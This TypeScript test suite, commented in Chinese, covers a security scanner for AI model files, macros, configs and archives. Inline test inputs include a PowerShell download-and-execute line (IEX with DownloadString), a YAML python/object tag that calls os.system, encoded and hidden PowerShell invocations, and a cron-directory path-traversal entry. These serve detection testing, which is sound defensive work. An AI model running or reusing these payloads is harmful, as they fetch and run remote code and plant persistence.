import { after, before, test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdtemp, readFile, readdir, rm, stat } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { dirname, join, relative } from 'node:path';
import { fileURLToPath } from 'node:url';
import { scanModelBytes } from '../src/modules/model-files/scanner.js';
import { scanAllowedDirectory } from '../src/modules/model-files/filesystem.js';
import { linkAutoMap } from '../src/modules/model-files/script-scan.js';
import { AUX_FORMATS } from '../src/modules/model-files/types.js';
import { MODEL_FILE_RULES, modelFileRule } from '../src/modules/model-files/rules.js';
import { allAiAssetRules } from '../src/modules/engines/ai-asset/taxonomy.js';

/**
 * 样本由 fixtures/model-files/gen_scripts.py 生成到临时目录：每种语言一个恶意、一个正常，
 * 另有 Office 宏文档、配置文件、auto_map 目录和夹带脚本的 PyTorch 归档。
 */
interface Expect {
  file: string;
  lang: string;
  rules: string[];
  clean: boolean;
}
const ORDER = ['INFO', 'LOW', 'MEDIUM', 'HIGH', 'CRITICAL'];
const here = dirname(fileURLToPath(import.meta.url));
let dir = '';
let manifest: Expect[] = [];

before(async () => {
  dir = await mkdtemp(join(tmpdir(), 'lse-mf-scripts-'));
  execFileSync('python3', [join(here, 'fixtures/model-files/gen_scripts.py'), dir], {
    cwd: join(here, 'fixtures/model-files'),
    env: { ...process.env, PYTHONDONTWRITEBYTECODE: '1' },
    stdio: 'pipe',
  });
  manifest = JSON.parse(await readFile(join(dir, 'manifest.json'), 'utf8')) as Expect[];
});
after(async () => {
  if (dir) await rm(dir, { recursive: true, force: true });
});

test('样本覆盖 Python、JavaScript、TypeScript、Shell、PowerShell、批处理、VBScript、VBA 的恶意和正常各一', () => {
  for (const lang of [
    'python',
    'javascript',
    'typescript',
    'shell',
    'powershell',
    'batch',
    'vbscript',
    'vba',
  ]) {
    assert.ok(
      manifest.some((m) => m.lang === lang && !m.clean),
      `缺少 ${lang} 恶意样本`,
    );
    assert.ok(
      manifest.some((m) => m.lang === lang && m.clean),
      `缺少 ${lang} 正常样本`,
    );
  }
});

test('每个样本：恶意命中指定规则，正常不出中危及以上', async () => {
  const failures: string[] = [];
  for (const m of manifest) {
    const r = await scanModelBytes(m.file, await readFile(join(dir, m.file)));
    const ids = r.findings.map((f) => f.ruleId);
    for (const want of m.rules)
      if (!ids.includes(want))
        failures.push(`${m.file} 未命中 ${want}（实际 ${ids.join(',') || '无'}）`);
    const worst = Math.max(...r.findings.map((f) => ORDER.indexOf(f.severity)), 0);
    if (m.clean && worst >= ORDER.indexOf('MEDIUM'))
      failures.push(
        `${m.file} 误报：${r.findings.map((f) => `${f.severity}:${f.ruleId}`).join(',')}`,
      );
    if (!m.clean && worst < ORDER.indexOf('MEDIUM'))
      failures.push(`${m.file} 恶意样本没有中危及以上`);
  }
  assert.deepEqual(failures, []);
});

test('脚本按语言标出格式，压缩包里的脚本问题标出语言', async () => {
  assert.equal(
    (await scanModelBytes('a/evil.ps1', await readFile(join(dir, 'scripts/evil.ps1')))).format,
    'powershell',
  );
  assert.equal(
    (await scanModelBytes('evil.cmd', await readFile(join(dir, 'scripts/evil.cmd')))).format,
    'batch',
  );
  const office = await scanModelBytes('evil.xlsm', await readFile(join(dir, 'office/evil.xlsm')));
  assert.equal(office.format, 'office-macro');
  assert.ok(
    office.findings.filter((f) => f.ruleId.startsWith('vba.')).every((f) => f.format === 'vba'),
  );
  const pt = await scanModelBytes('model.pt', await readFile(join(dir, 'archive/model.pt')));
  assert.equal(pt.format, 'pytorch-zip');
  const hook = pt.findings.find((f) => f.ruleId === 'code.command_execution')!;
  assert.equal(hook.format, 'python');
  assert.match(hook.detail, /archive\/code\/hook\.py/);
});

test('xlsm 里 AutoOpen + Shell：自动执行的宏调用命令，严重', async () => {
  const r = await scanModelBytes('evil.xlsm', await readFile(join(dir, 'office/evil.xlsm')));
  const f = r.findings.find((x) => x.ruleId === 'vba.auto_exec_payload');
  assert.ok(f, r.findings.map((x) => x.ruleId).join(','));
  assert.equal(f!.severity, 'CRITICAL');
  assert.match(f!.detail, /AutoOpen/);
});

test('tokenizer_config.json 的危险 chat_template 命中模板逃逸规则', async () => {
  const r = await scanModelBytes(
    'tokenizer_config.json',
    await readFile(join(dir, 'configs/ssti/tokenizer_config.json')),
  );
  const f = r.findings.find((x) => x.ruleId === 'GGUF_TEMPLATE_SSTI');
  assert.ok(f);
  assert.equal(f!.severity, 'HIGH');
  assert.match(f!.detail, /tokenizer_config\.json/);
});

test('auto_map 指向的 .py 被纳入扫描并与配置关联', async () => {
  const root = join(dir, 'automap');
  const r = await scanAllowedDirectory(root, [root], {
    pickleMaxBytes: 1 << 20,
    totalMaxBytes: 1 << 26,
    maxFiles: 100,
  });
  const files = linkAutoMap(r.files);
  const cfg = files.find((f) => f.path === 'config.json')!;
  const auto = cfg.findings.find((f) => f.ruleId === 'config.auto_map');
  assert.ok(auto, cfg.findings.map((f) => f.ruleId).join(','));
  assert.match(auto!.detail, /已纳入扫描：modeling_evil\.py/);
  assert.match(auto!.detail, /未在扫描范围内找到：configuration_evil\.py/);
  const py = files.find((f) => f.path === 'modeling_evil.py')!;
  assert.equal(py.format, 'python');
  assert.deepEqual(py.meta.autoMapFrom, ['config.json']);
  assert.ok(py.findings.some((f) => f.ruleId === 'code.command_execution'));
});

test('目录扫描纳入脚本、配置和 Office 宏文档', async () => {
  const r = await scanAllowedDirectory(dir, [dir], {
    pickleMaxBytes: 1 << 20,
    totalMaxBytes: 1 << 26,
    maxFiles: 1000,
  });
  const paths = new Set(r.files.map((f) => f.path));
  for (const p of [
    'scripts/evil.py',
    'scripts/evil.vbs',
    'scripts/evil.bat',
    'office/evil.docm',
    'office/evil.pptm',
    'office/evil.xls',
    'configs/evil/train.yaml',
  ])
    assert.ok(paths.has(p), `目录扫描未纳入 ${p}`);
  assert.ok(!paths.has('manifest.json'));
});

const severe = <T extends { severity: string }>(fs: T[]) =>
  fs.filter((f) => ORDER.indexOf(f.severity) >= ORDER.indexOf('MEDIUM'));

test('真实 HF 代码、模板和常见正常写法不出中危及以上；chatglm3 的 eval(content) 仍为高危', async () => {
  const root = join(here, 'fixtures/model-files/benign');
  const walk = async (d: string): Promise<string[]> =>
    (
      await Promise.all(
        (await readdir(d)).map(async (n) => {
          const p = join(d, n);
          return (await stat(p)).isDirectory() ? walk(p) : [p];
        }),
      )
    ).flat();
  const hits: string[] = [];
  let scanned = 0;
  for (const p of await walk(root)) {
    if (p.endsWith('SOURCES.txt')) continue;
    const rel = relative(root, p);
    const r = await scanModelBytes(rel, await readFile(p));
    scanned++;
    for (const f of severe(r.findings))
      hits.push(`${rel} ${f.severity} ${f.ruleId} ${f.detail.slice(0, 80)}`);
  }
  assert.ok(scanned >= 20, `只扫了 ${scanned} 个`);
  assert.equal(hits.length, 1, hits.join('\n'));
  assert.match(
    hits[0]!,
    /^hf\/zai-org__chatglm3-6b\/modeling_chatglm\.py HIGH code\.dynamic_execution .*eval\(content\)/,
  );
});

test('YAML：只有 !!python/ 标签是高危，trust_remote_code、命令片段降为低危；私有地址不算可疑链接', async () => {
  const lora = await scanModelBytes(
    'train_lora.yaml',
    await readFile(join(here, 'fixtures/model-files/benign/handmade/train_lora.yaml')),
  );
  assert.deepEqual(
    lora.findings.map((f) => [f.ruleId, f.severity]),
    [['config.trust_remote_code', 'LOW']],
  );
  const compose = await scanModelBytes(
    'docker-compose.yml',
    await readFile(join(here, 'fixtures/model-files/benign/handmade/docker-compose.yml')),
  );
  assert.ok(!compose.findings.some((f) => f.ruleId === 'config.suspicious_url'));
  assert.deepEqual(severe(compose.findings), []);
  const tag = await scanModelBytes(
    'x.yaml',
    Buffer.from('cb: !!python/object/apply:os.system ["id"]\n'),
  );
  assert.equal(tag.findings.find((f) => f.ruleId === 'config.yaml_python_tag')?.severity, 'HIGH');
  const json = await scanModelBytes(
    'generation_config.json',
    Buffer.from(
      JSON.stringify({
        a: 'http://10.0.0.12:8000/v1',
        b: 'http://172.20.1.5/run.sh',
        c: 'http://192.168.1.10:8080/x.py',
        d: 'http://localhost:8000',
        e: 'http://127.0.0.1/a.sh',
      }),
    ),
  );
  assert.ok(
    !json.findings.some((f) => f.ruleId === 'config.suspicious_url'),
    JSON.stringify(json.findings),
  );
  const pub = await scanModelBytes(
    'generation_config.json',
    Buffer.from(JSON.stringify({ a: 'http://203.0.113.7:8000/v1' })),
  );
  assert.equal(pub.findings.find((f) => f.ruleId === 'config.suspicious_url')?.severity, 'MEDIUM');
});

test('目录扫描：YAML 只看 mergekit 配置和与权重同目录的，跳过 .github 和 docker-compose', async () => {
  const root = join(here, 'fixtures/model-files/benign/handmade');
  const r = await scanAllowedDirectory(root, [root], {
    pickleMaxBytes: 1 << 20,
    totalMaxBytes: 1 << 26,
    maxFiles: 100,
  });
  const paths = r.files.map((f) => f.path).sort();
  assert.deepEqual(paths, ['benign_macro.bas', 'install.ps1', 'run.bat', 'start.sh']);
});

test('VBA CreateObject：默认低危，ProgID 为 WScript.Shell、MSXML2、ADODB.Stream 等时升为中危', async () => {
  const sev = async (code: string) =>
    (await scanModelBytes('m.bas', Buffer.from(code))).findings.find(
      (f) => f.ruleId === 'vba.create_object',
    )?.severity;
  assert.equal(await sev('Set d = CreateObject("Scripting.Dictionary")\n'), 'LOW');
  assert.equal(await sev('Set o = CreateObject(progId)\n'), 'LOW');
  assert.equal(await sev('Set o = CreateObject("WScript.Shell")\n'), 'MEDIUM');
  assert.equal(await sev('Set o = CreateObject("Shell.Application")\n'), 'MEDIUM');
  assert.equal(await sev('Set o = CreateObject("MSXML2.ServerXMLHTTP.6.0")\n'), 'MEDIUM');
  assert.equal(await sev('Set o = CreateObject("ADODB.Stream")\n'), 'MEDIUM');
  assert.equal(await sev('Set o = CreateObject("WinHttp.WinHttpRequest.5.1")\n'), 'MEDIUM');
  const benign = await scanModelBytes(
    'benign_macro.bas',
    await readFile(join(here, 'fixtures/model-files/benign/handmade/benign_macro.bas')),
  );
  assert.deepEqual(severe(benign.findings), []);
});

test('PowerShell：Bypass 加本地 -File 为低危，隐藏窗口或 -enc、-c 执行为中危，单独 -NoProfile 不报', async () => {
  const sev = async (line: string) =>
    (await scanModelBytes('a.bat', Buffer.from(`${line}\n`))).findings.find(
      (f) => f.ruleId === 'win.hidden_powershell',
    )?.severity;
  assert.equal(
    await sev('powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0install.ps1"'),
    'LOW',
  );
  assert.equal(await sev('powershell -ep bypass .\\setup.ps1'), 'LOW');
  assert.equal(
    await sev('powershell -ExecutionPolicy Bypass -File \\\\srv\\share\\a.ps1'),
    'MEDIUM',
  );
  assert.equal(await sev('powershell -w hidden -File a.ps1'), 'MEDIUM');
  assert.equal(await sev('powershell -WindowStyle Hidden -ep bypass a.ps1'), 'MEDIUM');
  assert.equal(await sev('powershell -c "Get-Date"'), 'MEDIUM');
  assert.equal(
    await sev('pwsh -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA'),
    'MEDIUM',
  );
  assert.equal(await sev('powershell -NoProfile -File a.ps1'), undefined);
});

test('UTF-16BE（带 BOM）的 PowerShell 脚本按 UTF-16BE 解码后检查', async () => {
  const text = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a.ps1')\n";
  const le = Buffer.from(text, 'utf16le');
  const be = Buffer.from(le);
  be.swap16();
  const r = await scanModelBytes('a.ps1', Buffer.concat([Buffer.from([0xfe, 0xff]), be]));
  assert.ok(
    r.findings.some((f) => f.ruleId === 'win.download_exec'),
    r.findings.map((f) => f.ruleId).join(','),
  );
});

test('压缩包：宏文档和一层嵌套 zip 也检查，再深一层的不展开并给低危提示', async () => {
  const r = await scanModelBytes('upload.zip', await readFile(join(dir, 'archive/bundle.zip')));
  const by = (rule: string, re: RegExp) =>
    r.findings.find((f) => f.ruleId === rule && re.test(f.detail));
  const macro = by('vba.auto_exec_payload', /bundle\/macro\.xlsm/);
  assert.ok(macro, r.findings.map((f) => `${f.ruleId} ${f.detail.slice(0, 60)}`).join('\n'));
  assert.equal(macro!.format, 'vba');
  const nested = by('code.remote_code_execution', /nested\/inner\.zip\/x\/evil\.sh/);
  assert.ok(nested, r.findings.map((f) => `${f.ruleId} ${f.detail.slice(0, 60)}`).join('\n'));
  assert.equal(nested!.format, 'shell');
  assert.ok(by('code.obfuscated_execution', /\.\.\/\.\.\/etc\/cron\.d\/evil\.py/));
  assert.ok(
    !r.findings.some(
      (f) => /deep\/evil\.sh/.test(f.detail) && f.ruleId !== 'ARCHIVE_ENTRIES_SKIPPED',
    ),
  );
  const skipped = r.findings.find((f) => f.ruleId === 'ARCHIVE_ENTRIES_SKIPPED');
  assert.equal(skipped?.severity, 'LOW');
  assert.match(skipped!.detail, /nested\/inner\.zip\/y\/deeper\.zip/);
});

test('压缩包：超过 500 个条目或读取总量预算的条目不检查，补一条低危提示', async () => {
  const many = await scanModelBytes('many.zip', await readFile(join(dir, 'archive/many.zip')));
  const note = many.findings.find((f) => f.ruleId === 'ARCHIVE_ENTRIES_SKIPPED');
  assert.equal(note?.severity, 'LOW');
  assert.match(note!.detail, /5 个条目/);
  assert.match(note!.detail, /500/);
  const small = await scanModelBytes(
    'upload.zip',
    await readFile(join(dir, 'archive/bundle.zip')),
    {
      pickleMaxBytes: 1 << 20,
      archiveTextMaxBytes: 64,
    },
  );
  const budget = small.findings.find((f) => f.ruleId === 'ARCHIVE_ENTRIES_SKIPPED');
  assert.ok(budget);
  assert.match(budget!.detail, /bundle\/macro\.xlsm/);
});

test('目录扫描跳过依赖和虚拟环境目录', async () => {
  const root = join(dir, 'deps');
  const r = await scanAllowedDirectory(root, [root], {
    pickleMaxBytes: 1 << 20,
    totalMaxBytes: 1 << 26,
    maxFiles: 100,
  });
  assert.deepEqual(
    r.files.map((f) => f.path),
    ['model/model.safetensors'],
  );
});

test('数量上限时：与 config.json 同目录的 .py 排在其他脚本前面', async () => {
  const root = join(dir, 'prio');
  const r = await scanAllowedDirectory(root, [root], {
    pickleMaxBytes: 1 << 20,
    totalMaxBytes: 1 << 26,
    maxFiles: 2,
  });
  assert.deepEqual(r.files.map((f) => f.path).sort(), ['model/config.json', 'model/modeling_x.py']);
});

test('ZIP 压缩包不进 AIBOM 的模型组件', () => {
  assert.ok(AUX_FORMATS.has('zip'));
});

test('规则清单：每条有 id、类别、严重度、说明，id 不重复；组件扫描规则是引用不是复制', () => {
  const ids = MODEL_FILE_RULES.map((r) => r.id);
  assert.equal(new Set(ids).size, ids.length);
  for (const r of MODEL_FILE_RULES) {
    assert.ok(r.id && r.category && r.title && r.description, JSON.stringify(r));
    assert.ok(ORDER.includes(r.severity), r.id);
  }
  const cmd = modelFileRule('code.command_execution')!;
  const src = allAiAssetRules().find((r) => r.ruleId === 'code.command_execution')!;
  assert.equal(cmd.title, src.title);
  assert.equal(cmd.description, src.description);
  for (const id of [
    'vba.auto_exec',
    'vba.shell_exec',
    'vba.download',
    'vba.environ',
    'vba.obfuscation',
    'vba.shell_command',
    'config.auto_map',
    'config.trust_remote_code',
    'config.suspicious_url',
    'config.command_fragment',
    'GGUF_TEMPLATE_SSTI',
    'KNOWN_MODEL_HASH_MISMATCH',
    'PICKLE_DANGEROUS_GLOBAL',
  ])
    assert.ok(modelFileRule(id), `规则清单缺少 ${id}`);
});

test('模型文件模块源码里出现的每个 ruleId 都在规则清单里', async () => {
  const srcDir = join(here, '../src/modules/model-files');
  const missing: string[] = [];
  for (const name of await readdir(srcDir)) {
    if (!name.endsWith('.ts') || name.endsWith('.test.ts')) continue;
    const text = await readFile(join(srcDir, name), 'utf8');
    for (const m of text.matchAll(/ruleId: '([A-Za-z0-9_.]+)'/g))
      if (!modelFileRule(m[1]!)) missing.push(`${name}: ${m[1]}`);
  }
  for (const p of ['KERAS', 'KERAS_H5'])
    for (const s of ['LAMBDA_LAYER', 'CUSTOM_OBJECT'])
      if (!modelFileRule(`${p}_${s}`)) missing.push(`${p}_${s}`);
  assert.deepEqual(missing, []);
});
